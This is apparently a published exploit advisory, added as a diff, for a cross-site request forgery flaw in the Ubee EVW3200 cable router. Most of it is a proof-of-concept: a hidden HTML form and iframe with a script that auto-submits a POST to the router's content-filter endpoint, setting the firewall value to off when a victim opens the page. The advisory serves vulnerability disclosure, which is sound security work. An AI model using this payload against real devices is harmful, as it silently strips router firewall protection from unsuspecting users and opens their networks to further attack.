@@ -1,0 +1,64 @@
+# Exploit Title: Ubee EVW3200 - Multiple Cross Site Request Forgery
+
+# Google Dork: N/A
+
+# Date: 02-03-2014
+
+# Exploit Author: Jeroen - IT Nerdbox
+
+# Vendor Homepage: http://www.ubeeinteractive.com/
+
+# Software Link:
+http://www.ubeeinteractive.com/products/cable?field_product_catetory_tid=20
+
+# Version: All
+
+# Tested on: N/A
+
+# CVE : N/A
+
+#
+
+## Description:
+
+#
+
+# The Ubee ECV3200 does not use Anti CSRF tokens in any of its forms. 
+
+#
+
+## PoC:
+
+# 
+
+# <form name="reseller" method="POST"
+action="http://192.168.178.1/goform/RgContentFilter" id="csrf_attack"
+target="csrf_iframe">
+
+#   <input type="hidden" name="cbFirewall" value="0">
+
+# </form>
+
+#
+
+# <iframe id="csrf_iframe" style="visibility:hidden;display:none"></iframe>
+
+#
+
+# <script>
+
+#  document.getElementById('csrf_attack').submit();
+
+# </script>
+
+# <center>The payload has been executed....</center> 
+
+#</html>
+
+#
+
+#
+
+# More information can be found at:
+http://www.nerdbox.it/ubee-evw3200-multiple-vulnerabilities/
+
